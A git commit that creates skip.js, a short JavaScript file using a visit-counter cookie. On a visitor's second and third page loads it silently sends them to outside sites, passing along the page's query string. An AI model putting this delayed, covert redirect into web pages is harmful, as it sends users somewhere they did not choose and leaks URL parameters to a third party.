357c40f73d098477fa6c1afccc25e85f65a05262
aifuli <aifuli@users.noreply.github.com>
2015-02-03 23:17:56 +0800

    Create skip.js

---
+++ skip.js
@@ -0,0 +1,25 @@
+function setCookie(name,value)
+{
+var Days = 1;  var exp = new Date(); 
+exp.setTime(exp.getTime() + Days*24*60*60*1000);    document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
+}
+
+function getCookie(name)
+{
+var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
+if(arr=document.cookie.match(reg))   return unescape(arr[2]);
+else return null;
+}
+
+var ss= location.search;
+go2="http://www.aionsyy.com/3/?id=a1-7669";
+go3="http://aifuli.github.io/aifuli/91aiai.html";
+
+if(  getCookie("x8x")==1 )                                //
+  { setCookie("x8x",2);   window.location=go2+ss;   }
+
+else if(  getCookie("x8x")==2 )                           //
+  { setCookie("x8x",3);   window.location=go3+ss;   }
+
+else
+  { setCookie("x8x",1);  }   // 
